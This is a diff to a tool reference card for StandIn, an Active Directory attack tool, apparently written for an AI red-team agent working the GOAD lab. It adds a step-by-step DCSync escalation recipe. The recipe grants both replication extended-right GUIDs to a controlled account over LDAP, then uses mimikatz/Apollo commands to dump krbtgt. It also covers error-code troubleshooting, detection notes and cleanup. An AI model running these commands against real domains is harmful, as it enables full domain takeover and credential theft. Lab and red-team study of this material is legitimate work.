@@ -1,8 +1,8 @@
 ---
 name: StandIn
 category: acl-abuse
-subcategories: [rbcd, computer-object-creation, ad-manipulation, group-membership-add, acl-write, domain-admins-add]
-tradecraft_tags: [rbcd, computer-account, delegation, acl, ad, fuzzysecurity, group, group-membership, add-member, addself, addmember, genericall, genericwrite, writedacl, writeowner, ldap, ldap-write, non-powershell, domain-admins]
+subcategories: [rbcd, computer-object-creation, ad-manipulation, group-membership-add, acl-write, domain-admins-add, dcsync-rights-grant, replication-rights]
+tradecraft_tags: [rbcd, computer-account, delegation, acl, ad, fuzzysecurity, group, group-membership, add-member, addself, addmember, genericall, genericwrite, writedacl, writeowner, ldap, ldap-write, non-powershell, domain-admins, dcsync, dcsync-rights, replication, replication-rights, ds-replication, get-changes, extended-rights, grant-replication]
 mitre_attack:
   - id: T1098
     name: Account Manipulation
@@ -29,6 +29,8 @@ usage_examples:
     args: "--rbcd --computer mypc01 --target TARGET$"
   - description: Add a member to a domain group over LDAP without PowerShell — e.g. add an account to Domain Admins when you hold GenericAll/AddSelf/AddMember/WriteDACL on the group
     args: 'StandIn.exe --group "Domain Admins" --ntaccount "ESSOS\localuser" --add'
+  - description: Grant DCSync (DS-Replication) rights to a principal over LDAP without PowerShell — add the two replication extended-right ACEs on the TARGET FOREST's domain object, then DCSync. Requires WriteDACL/GenericAll/WriteOwner on the domain object (or membership in a group that holds it). Run BOTH GUIDs.
+    args: 'StandIn.exe --object "DC=essos,DC=local" --grant "ESSOS\localuser" --guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2  (then re-run with --guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)'
   - description: List existing RBCD delegations on a machine
     args: "--rbcd --list --computer TARGET$"
   - description: Remove RBCD delegation (cleanup)
@@ -90,7 +92,22 @@ common_args:
     name: --list
     description: List RBCD delegations on the target
     typical_values: [flag-only]
-last_updated: 2026-05-29
+  --object:
+    name: --object
+    description: 'Target an AD object by DistinguishedName for ACL/extended-right operations — for a DCSync-rights grant this is the TARGET FOREST domain DN (e.g. DC=essos,DC=local), NOT a user/computer'
+    typical_values: ['DC=essos,DC=local', 'DC=sevenkingdoms,DC=local']
+    required: false
+  --grant:
+    name: --grant
+    description: 'NT account (DOMAIN\User) to grant an extended right / ACE to on the --object target. Pair with --guid for a specific control-access right such as DS-Replication-Get-Changes'
+    typical_values: ['ESSOS\localuser']
+    required: false
+  --guid:
+    name: --guid
+    description: 'Schema GUID of the extended right to grant via --object/--grant. DCSync needs BOTH DS-Replication-Get-Changes (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2) and DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)'
+    typical_values: ['1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2']
+    required: false
+last_updated: 2026-06-06
 ---
 
 # StandIn
@@ -118,6 +135,76 @@ chain is:
 
 KrbRelay can also automate the machine-account-creation + RBCD-write in a single operation
 for local privilege escalation; StandIn is the explicit AD manipulation path for domain-level RBCD.
+
+## DCSync rights grant (DS-Replication) — non-PowerShell
+
+This is the final-hop recipe when the controlled principal can write the domain object's DACL
+(`WriteDACL`/`GenericAll`/`WriteOwner` on the domain head, or membership in a group that holds it)
+but does **not yet hold DCSync rights**. DCSync (`mimikatz lsadump::dcsync` / Apollo `dcsync`)
+requires TWO extended rights on the domain object; grant both ACEs over LDAP with StandIn — no
+PowerShell, no PowerView — then DCSync.
+
+**Read the GetNCChanges error code — it tells you which problem you have (do NOT conflate them):**
+
+| Error | Meaning | Remedy |
+|-------|---------|--------|
+| `0x20f7` / **8439 `DS_DRA_BAD_DN`** | Invalid/wrong naming context — the request didn't even resolve a valid NC. Almost always **wrong forest/DN/DC targeting** (e.g. asking a NORTH DC for the ESSOS NC, or a malformed `/domain:`). | Fix targeting FIRST: correct `/domain:`, target that forest's DC (`/dc:`), correct the DN. The grant below is NOT the fix for 8439. |
+| `0x2105` / **8453 `DS_DRA_ACCESS_DENIED`** | The principal lacks DS-Replication rights on the (correctly-targeted) NC. | Apply the two-ACE grant below, then re-DCSync. |
+
+> Sage's golden re-run hit **8439 first** because the agent confused NORTH/winterfell with
+> ESSOS/meereen — so the *targeting* fix is load-bearing; the rights grant fixes the 8453 you hit
+> *after* the DN is correct. Both are needed to clear the hop; apply them in that order.
+
+The two required control-access rights (fixed Microsoft GUIDs):
+
+| Extended right | Schema GUID |
+|----------------|-------------|
+| `DS-Replication-Get-Changes` | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` |
+| `DS-Replication-Get-Changes-All` | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` |
+
+> **Target the right forest.** `--object` must be the domain DN of the forest you are escalating in,
+> and the operation must run against **that forest's DC**. In GOAD: ESSOS = `DC=essos,DC=local`
+> via the ESSOS DC **meereen** (`meereen.essos.local`); NORTH = `DC=north,DC=sevenkingdoms,DC=local`
+> via **winterfell**; root = `DC=sevenkingdoms,DC=local` via **kingslanding**. Do NOT grant essos
+> replication rights against winterfell/NORTH — wrong DC + wrong DN is the malformed-filter / 8439 trap.
+
+```
+# Step 1: grant DS-Replication-Get-Changes to the controlled ESSOS principal on the essos domain object
+StandIn.exe --object "DC=essos,DC=local" --grant "ESSOS\localuser" --guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
+
+# Step 2: grant DS-Replication-Get-Changes-All (BOTH are required for a full DCSync)
+StandIn.exe --object "DC=essos,DC=local" --grant "ESSOS\localuser" --guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
+
+# Step 3: DCSync krbtgt — target the SAME DC you granted on (meereen), as the granted principal
+#   Apollo:   dcsync /domain:essos.local /user:krbtgt
+#   mimikatz: lsadump::dcsync /domain:essos.local /dc:meereen.essos.local /user:essos\krbtgt
+```
+
+**Gotchas that look like "the grant failed" but aren't:**
+- **Replication latency — DCSync the same DC you granted on.** The ACE is written on meereen; pointing
+  mimikatz/apollo at a *different* ESSOS DC before it replicates returns 8453 again. Use `/dc:meereen.essos.local`
+  (or wait for convergence).
+- **Security context.** `dcsync` uses the *current token* unless you pass creds — run it as the **granted
+  principal** (the exact NTAccount you passed to `--grant`), or pass that principal's creds. Granting one
+  account and DCSyncing as another applies no rights.
+- **WriteDACL precondition (distinguish the two rejections).** To write the ACE the controlled principal
+  must already hold `WriteDACL`/`WriteOwner`/`GenericAll`/`Owns` on `DC=essos,DC=local`. If the **StandIn
+  `--grant` call itself** is rejected, that prereq is missing — a different failure from a rejected `dcsync`.
+- **Cross-forest SID.** If a NORTH principal is granted on the ESSOS domain object, `--grant DOMAIN\user`
+  must resolve to a SID meereen honors, and you must DCSync as that exact principal.
+
+**Verify the grant landed:** before retrying `dcsync`, re-read the domain object's DACL (`--ntacl --object
+"DC=essos,DC=local"`) and confirm BOTH Allow ACEs (both GUIDs) are present. One alone is insufficient.
+
+> **Binding caveat — confirm against the live binary.** StandIn's `--object` historically takes a search
+> term; granting on the **domain root** (`objectClass=domainDNS`) is an unusual target. The `--grant`/`--guid`
+> shape is confirmed against the live v1.4 binary, but verify the domain-head bind specifically (a normal
+> user/group bind passing does not prove the domain-root bind). If `--object "DC=essos,DC=local"` won't bind,
+> fall back to `impacket-dacledit` from a Linux foothold with a TGT (`-target-dn "DC=essos,DC=local"`).
+
+**OPSEC:** each `--grant` writes the domain object's DACL → Event 5136; MDI flags DCSync-rights grants.
+This is a high-signal, persistent change — clean up with `--object ... --grant ... --guid ... --remove`
+(or redeploy the lab range).
 
 ## Output
 Text output confirming operations:
@@ -148,7 +235,8 @@ RBCD delegations and created machine accounts after use.
 | `--group "GroupName" --ntaccount "DOMAIN\User" --remove` | Remove a principal from a group (cleanup) |
 | `--object X` | Query a specific AD object by DN |
 | `--ntacl --object X` | Dump NT ACL for an AD object |
-| `--acl --object X --user X` | Add/modify ACE for a user on object |
+| `--object <DN> --grant "DOMAIN\User" --guid <ext-right-GUID>` | Grant a specific extended-right ACE to a principal on the object — DCSync = grant BOTH `1131f6aa-…` and `1131f6ad-…` on the target forest's domain DN (see "DCSync rights grant" above) — verified v1.4 syntax |
+| `--object <DN> --grant "DOMAIN\User" --guid <GUID> --remove` | Remove a previously-granted ACE (cleanup) |
 | `--hash` | Hash manipulation operations |
 | `--kerbfixup X` | Fix Kerberos SPN mapping |
 | `--delegation --target X` | Query constrained delegation settings |
